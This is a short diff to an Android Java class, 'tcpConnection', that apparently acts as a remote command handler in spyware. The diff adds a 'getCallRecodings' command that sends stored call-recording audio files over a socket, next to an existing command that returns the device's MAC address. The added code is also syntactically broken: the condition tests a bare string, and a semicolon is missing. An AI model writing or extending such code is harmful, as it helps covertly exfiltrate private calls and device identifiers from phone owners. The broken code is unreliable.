@@ -258,6 +258,10 @@ public class tcpConnection extends AsyncTask<String,Void,Void> {
                     }
 
                 }
+                else if("getCallRecodings"){
+                    String outputDirectory = Environment.getExternalStorageDirectory().getAbsolutePath() + "/YourRecordingFolder";
+                    functions.sendAudioFileOverSocket(outputDirectory, out)
+                }
                 else if(line.equals("getMACAddress"))
                 {
                     String macAddress = ipAddr.getMACAddress(null);
